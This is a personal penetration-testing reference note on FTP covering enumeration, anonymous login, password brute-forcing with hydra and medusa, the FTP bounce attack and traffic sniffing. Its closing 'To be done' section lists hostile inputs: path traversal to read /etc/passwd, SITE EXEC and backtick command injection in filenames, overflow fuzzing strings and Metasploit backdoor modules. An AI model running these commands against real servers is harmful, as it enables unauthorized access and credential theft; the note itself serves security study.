---
created: 2025-09-10
---
## FTP

>**FTP (File Transfer Protocol)** is an industry standard protocol used to transfer files over a network, originally developed in the 1970s.

- Despite its widespread use, FTP has fundamental security weaknesses that make it a popular target for attackers.

>[!important] By default, FTP listens on TCP port `21` for control connections and uses TCP port `20` for data connections in active mode.

>[!critical] All FTP data is transmitted in plain text.
>All FTP communications, including authentication credentials and file content, are transmitted in **plain text** without encryption. This makes FTP vulnerable to eavesdropping attacks.

- To interact with FTP servers, you can use `ftp` — one of the most common CLI FTP clients.

>[!note] To read more on how FTP works, see [[྾_how_FTP_works]].

>[!note]+ FTP clients
>Here are some FTP clients you can use to interact with FTP servers:
> - [`ftp`](https://man.archlinux.org/man/ftp.1.enftp)
> - [`lftp`](https://lftp.yar.ru/)
> - [`filezilla`](https://filezilla-project.org/)
> - [`ncftp`](https://www.ncftp.com/)

>[!note]+ SFTP 
>**[SFTP](https://en.wikipedia.org/wiki/SSH_File_Transfer_Protocol) (SSH File Transfer Protocol)** is a secure file transfer protocol that runs over SSH.
## FTP enumeration

### Nmap

- FTP Nmap scanning:

```bash
sudo nmap -sC -sV -p 21 192.168.1.11
```

>[!note]+ Options
>- `-sC`: run default scripts, including [`ftp-anon`](https://nmap.org/nsedoc/scripts/ftp-anon.html) which checks if the target FTP server allows anonymous logins.
>- `-sV`: version enumeration.

- Check for anonymous login and gather information about FTP:

```bash
nmap --script ftp-anon,ftp-syst -p 21 192.168.1.11
```

- List Nmap scripts for FTP:

```bash
ls -l /usr/share/nmap/scripts/*ftp*
```

- Execute all Nmap scripts relevant to FTP:

```bash
nmap --script ftp*  192.168.1.11
```

>[!tip] 
>To print help for a particular Nmap script, run:
>```bash
>nmap --script-help SCRIPT_NAME
>```

| Name                                                                                | Categories                                | Description                                                                                               |
| ----------------------------------------------------------------------------------- | ----------------------------------------- | --------------------------------------------------------------------------------------------------------- |
| [`ftp-anon`](https://nmap.org/nsedoc/scripts/ftp-anon.html)                         | `default`, `auth`, `safe`                 | Checks if an FTP server allows anonymous logins (attempts to log in with the username `anonymous`).       |
| [`ftp-bounce`](https://nmap.org/nsedoc/scripts/ftp-bounce.html)                     | `default`, `safe`                         | Tests if an FTP server is vulnerable to the FTP bounce attack (indirect port scanning through the server) |
| [`ftp-syst`](https://nmap.org/nsedoc/scripts/ftp-syst.html)                         | `default`, `safe`, `discovery`            | Retrieves information about the operating system of the FTP server.                                       |
| [`tftp-enum`](https://nmap.org/nsedoc/scripts/tftp-enum.html)                       | `discovery`, `intrusive`                  | Enumerates TFTP filenames.                                                                                |
| [`ftp-brute`](https://nmap.org/nsedoc/scripts/ftp-brute.html)                       | `intrusive`, `brute`                      | Performs brute force password attack against FTP servers.                                                 |
| [`ftp-libopie`](https://nmap.org/nsedoc/scripts/ftp-libopie.html)                   | `vuln`, `intrusive`                       | Tests for the OPIE off-by-one stack overflow attack (CVE-2010-1938).                                      |
| [`ftp-proftpd-backdoor`](https://nmap.org/nsedoc/scripts/ftp-proftpd-backdoor.html) | `exploit`, `intrusive`, `malware`, `vuln` | Tests for the presence of the ProFTPD 1.3.3c backdoor reported as BID 45150.                              |
| [`ftp-vsftpd-backdoor`](https://nmap.org/nsedoc/scripts/ftp-vsftpd-backdoor.html)   | `exploit`, `intrusive`, `malware`, `vuln` | Tests for the presence of the vsFTPd 2.3.4 backdoor reported on 2011-07-04 (CVE-2011-2523).               |

### Banner grabbing

 - Netcat banner grabbing:

```bash
nc -vn IP_ADDRESS 21
```

- Custom timeout:

```bash
echo "HELP" | nc -w 5 IP_ADDRESS 21
```

```bash
echo "SYST" | nc -w 5 IP_ADDRESS 21
```

```bash
echo "STAT" | nc -w 5 IP_ADDRESS 21
```

- Telnet banner grabbing:

```bash
telnet IP_ADDRESS 21
```

- FTP server and version detection:

```bash
nmap -sV --version-intensity 9 -p 21 IP_ADDRESS
```


- Get TLS certificate if any (for FTPS):

```bash
openssl s_client -connect IP_ADDRESS:21 -starttls ftp
```
## FTP vulnerabilities

### Anonymous login

FTP servers often allow **anonymous login**: users connect with the username `anonymous` or `ftp` and any or simple default password.
Once logged-in, the attack can list directory contents, download files, and possibly upload. 

You can test for anonymous FTP login with Nmap, `ftp` client, or (Netcat):

- Nmap [`ftp-anon`](https://nmap.org/nsedoc/scripts/ftp-anon.html) script:

```bash
nmap --script ftp-anon -p 21 192.168.1.11
```

- `ftp` client:

```bash
ftp anonymous@192.168.1.11 21
```

- Netcat:

```bash
nc 192.168.1.11 21
# connection established
USER anonymous
PASS # any, leave blank
```

You can even try connecting to an FTP server via a browser using an `ftp://` URL:

```PowerShell
ftp://anonymous:anonymous@192.168.1.11
```


>[!tip]+
>You can interact with FTP using `wget` and `ftp://` links.
> For example, here is how to download all available files from an FTP server:
> 
> ```bash
> wget -m --no-passive ftp://anonymous:anonymous@192.168.1.11
> ```

>[!tip]+ Common anonymous credentials:
>- `anonymous:anonymous`
>- `anonymous:`
>- `_anonymous:`
>- `anonymous:guest`
>- `anonymous:test@test.com`
>- `ftp:ftp`
>- `_ftp:ftp`
>- `guest:guest`


>[!tip] 
>You can find a list of common default FTP credentials in [`SecLists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt`](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt).
>```bash
>curl -O -s https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt
>```

### Brute-force attack

FTP servers typically require username and password for authentication. As with any other service, if the credentials are weak, you can brute-force them. 

- FTP login brute-force with [[྾_medusa]]:

```bash
medusa -M ftp -h 192.168.1.11 -u admin -P passwords.txt
```

- To additionally check for empty passwords (`-e n`) and passwords matching the username (`-e s`):

```bash
medusa -M ftp -h 192.168.1.11 -u admin -P passwords.txt -e ns
```

- FTP login brute-force with [[྾_hydra]]:

```bash
hydra -L usernames.txt -P passwords.txt ftp://192.168.1.11
```

```bash
hydra -l admin -P passwords.txt ftp://192.168.1.11
```

```bash
hydra -L usernames.txt -P passwords.txt -s 2121 -V 192.168.1.11 ftp
```

### FTP bounce attack

FTP can operate in two modes: **active** and **passive**. 

**FTP bounce attack** exploits weaknesses in the **active FTP mode** to turn an FTP server to a proxy and use to scan the internal network and attack devices otherwise unreachable due to firewall restrictions.

>[!note]+ Active mode
> The **active FTP mode** works as follows:
> 
> 1. An **FTP client** opens a **control connection** to the FTP server's **TCP port `21`** to send FTP commands. 
> 2. The **FTP client** starts listening on an **arbitrary port** for a **data connection**. It then sends the **`PORT` command** to the server to tell the port it's listening on.
> 3. The **FTP server** initiates a **data connection** from its **TCP port `20`** to the client's specified port.
> 4. Once the data connection is established, data (files, directory listings, etc.) can be transferred from the server to client or vice versa.
> 5.  After the transfer is complete, the data connection is closed.
> 

>[!bug]+ FTP bounce attack
> 1. An attacker establishes an FTP **control connection** to an FTP server **P** (proxy).
> 2. The attacker sends a `PORT` command to the server **P**, but instead of specifying their own port number like in normal active FTP mode, they send an **arbitrary IP address and port number** of the device **T** (target) they want to access.
> 3. The FTP server then opens a data connection to the specified IP address and port on the device **T**.
> 4. The attacker then commands the FTP server **P** to transfer files to or from the target device **T**, or perform a port scan. For example, the attacker can force the server **P** to obtain sensitive files from the device **T**. 
> 5. The attacker then instructs the server **P** to forward obtained data back to the their machine.
>
>![[ftp_bounce_attack_geeksforgeeks.png]]
>Source: [`https://www.geeksforgeeks.org/what-is-ftp-bounce-attack/`](https://www.geeksforgeeks.org/what-is-ftp-bounce-attack/)


>[!note] Because the internal device sees the connection coming from a local FTP server acting as a proxy, but not an external attacker's IP address, this bypasses protection.


>[!note]
>Modern FTP servers include protections that, by default, prevent this type of attack, but if these features are misconfigured in modern-day FTP servers, the server can become vulnerable to an FTP Bounce attack.

You can use [Nmap](https://nmap.org/book/scan-methods-ftp-bounce-scan.html) to perform an FTP bounce scan:

```bash
nmap -b USERNAME:PASSWORD@FTP_SERVER -p TARGET_PORT TARGET_IP
```

- For example:

```bash
nmap -Pn -v -n anonymous:anonymous@192.168.1.11 -p 80 10.10.1.12
```

This command instructs the FTP server `192.168.1.11` to connect from itself to `10.10.1.12` on port `89` to check if the port is open using an FTP bounce attack. 

```bash
nmap -p21 --script ftp-bounce TARGET_IP
```

Manual FTP bounce exploitation:

```bash
# connect to FTP server
ftp 192.168.1.11
# log in
USER anonymous
PASS anonymous

# set target for bounce (IP in decimal format)
PORT 10,10,1,12,0,80  # targeting 10.10.1.12:80

# initiate data transfer to trigger connection
LIST
RETR filename.txt
```

Metasploit FTP bounce module:

```bash
use auxiliary/scanner/ftp/ftp_bounce
set RHOSTS ftp.server.com
set BOUNCE_HOST internal.target.com
set BOUNCE_PORT 80
run
```


>[!important] The attack requires you to be able to authenticate to the FTP server. 
### Plaintext authentication

If you have access to the network where the FTP server is located, you can intercept all FTP communications, including authentication credentials and sensitive files, since all FTP traffic is **transmitted in plaintext**.

```bash
sudo tcpdump -i eth -A -s 0 'port 21'
```

## FTP command reference

- Connect to an FTP server:

```bash
ftp -P [PORT] ftp.example.com
```

- Connect to an FTP server with an interactive mode:

```bash
ftp
ftp> open ftp.example.com
Connected to ftp.example.com
```

Once you're connected, the server may ask you to enter username and password. 

>[!important] If anonymous login is enabled, you will be able to access the server as the `anonymous` user.

>[!example]+ Example: anonymous login
>
> ```bash
> ftp> open 10.129.233.210
> Connected to 10.129.233.210.
> 220 ProFTPD Server (Debian) [10.129.233.210]
> Name (10.129.233.210:root): anonymous
> 331 Anonymous login ok, send your complete email address as your password
> Password: 
> 230 Anonymous access granted, restrictions apply
> Remote system type is UNIX.
> Using binary mode to transfer files.
> ```

After you've logged in, you can enter FTP commands. Most commonly used command shortcuts include:

Status and help commands:

| Command       | Description                                                        |
| ------------- | ------------------------------------------------------------------ |
| `?` or `help` | Display help for FTP commands.                                     |
| `!help`       | Show help for local commands.                                      |
| `verbose`     | Toggle verbose mode on/off (shows detaailed transfer information). |

Connection and session commands:

| Command                      | Description                     |
| ---------------------------- | ------------------------------- |
| `open HOSTNAME`              | Connect to an FTP server.       |
| `user [username] [password]` | Initiate login.                 |
| `close`                      | Close FTP connection.           |
| `bye`/`quit`                 | Exit FTP client.                |
| `status`                     | Show current connection status. |

Information gathering:


| Command | Description                |
| ------- | -------------------------- |
| `syst`  | Get system information.    |
| `stat`  | Display connection status. |
| `feat`  | List server features       |

File and directory navigation:

| Command                 | Description                                                               |
| ----------------------- | ------------------------------------------------------------------------- |
| `pwd`                   | Print current working directory on remote server.                         |
| `cd [directory]`        | Change directory on the remote machine.                                   |
| `cdup`                  | Change directory to parent directory.                                     |
| `lcd [local_directory]` | Change directory on your local machine.                                   |
| `ls`                    | List remote directory (shortcut to `LIST`)                                |
| `dir`                   | List remote directory in details (shortcut to `NLIST`).                   |
| `!`                     | Run shell commands on your local machine (e.g., `!ls` runs local `ls`)    |
| `hash`                  | Toggle printing `#` for each data block transferred (progress indicator). |

- To list now only visible files but also hidden files and directories:

```bash
ls -al
```


- To list files and directories recursively:

```bash
ls -R
```
File transfer commands:

| Command                             | Description                                  |
| ----------------------------------- | -------------------------------------------- |
| `get [remote_file] [local_file]`    | Download a file (shortcut to `RETR`).        |
| `mget [remote_files]`               | Download multiple files (wildcards allowed). |
| `put [local_file] [remote_file]`    | Upload file to the server.                   |
| `mput [local_files]`                | Upload multiple files to the server.         |
| `rename [old_name] [new_name]`      | Rename remote file.                          |
| `delete [remote_file]`              | Delete remote file.                          |
| `mkdir [directory]`                 | Create directory on remote server.           |
| `rmdir [directory]`                 | Remove remote directory.                     |
| `append [local_file] [remote_file]` | Append local file data to remote file.       |

- To download all files in the current directory:

```bash
mget *
```

Transfer mode and type commands:

| Command       | Description                                                   |
| ------------- | ------------------------------------------------------------- |
| `ascii`       | Set transfer mode to ASCII text.                              |
| `binary`      | Set transfer mode to binary (default for files).              |
| `mode [mode]` | Set transfer mode (e.g., `stream`, `block`, `compressed`).    |
| `type [type]` | Set file transfer type (e.g., `A` for ASCII, `I` for binary). |

>[!important] The FTP protocol itself is case-insensitive for command keywords. Commands typed in uppercase or lowercase are interpreted the same by servers.
>- The convention in documentation and usage is that FTP commands are usually shown in uppercase (e.g., `LIST`, `RETR`), but common FTP clients accept both cases.

>[!important] Case sensitivity mainly matters in filenames on servers (especially Linux) — filenames are case-sensitive, so commands affecting files need exact case.

## References and further reading

- [`21 - Pentesting FTP — HackTricks`](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-ftp/index.html)
- [`Active FTP vs. Passive FTP, a Definitive Explanation`](https://slacksite.com/other/ftp.html)
- [`Active vs. passive FTP simplified — jscape`](https://www.jscape.com/blog/active-v-s-passive-ftp-simplified)
- [`What is FTP Bounce Attack? — GeeksforGeeks`](https://www.geeksforgeeks.org/computer-networks/what-is-ftp-bounce-attack/)
- [`Script ftp-bounce ― Nmap.org`](https://nmap.org/nsedoc/scripts/ftp-bounce.html)
- [`TCP FTP Bounce Scan (-b) — Nmap.org`](https://nmap.org/book/scan-methods-ftp-bounce-scan.html)
- [`FTP Commands for Linux and UNIX`](https://www.solarwinds.com/serv-u/tutorials/ftp-commands-for-linux-unix)

### To be done (TBD)

- `CoreFTP before build 727` vulnerability assigned [`CVE-2022-22836`](https://nvd.nist.gov/vuln/detail/CVE-2022-22836)
- buffer overflow through FTP
	- ProFTPD versions with known overflows
	- vsFTPd with specific configurations
	- Core FTP Server builds before 727 (CVE-2022-22836)
```bash
# Long string fuzzing
python -c "print 'USER ' + 'A' * 1000" | nc target.com 21
python -c "print 'PASS ' + 'A' * 1000" | nc target.com 21

# Metasploit overflow modules
use exploit/unix/ftp/proftpd_modcopy_exec
use exploit/unix/ftp/vsftpd_234_backdoor
```
- directory traversal
```bash
# After FTP login, attempt path traversal
cd ../
cd ../../etc/
LIST /etc/passwd
RETR ../../../etc/passwd

# Windows-specific traversal
cd ..\
cd ..\..\windows\system32\
LIST C:\windows\system32\drivers\etc\hosts
```
- protocol command injection
```bash
# Command injection in SITE commands
SITE EXEC id
SITE EXEC cat /etc/passwd
SITE CHMOD 777 /tmp/

# Injection in filename parameters
STOR `id`.txt
RETR `whoami`.txt

# Using FTP client scripting
echo -e "USER anonymous
PASS test
SITE EXEC whoami
QUIT" | nc target.com 21
```



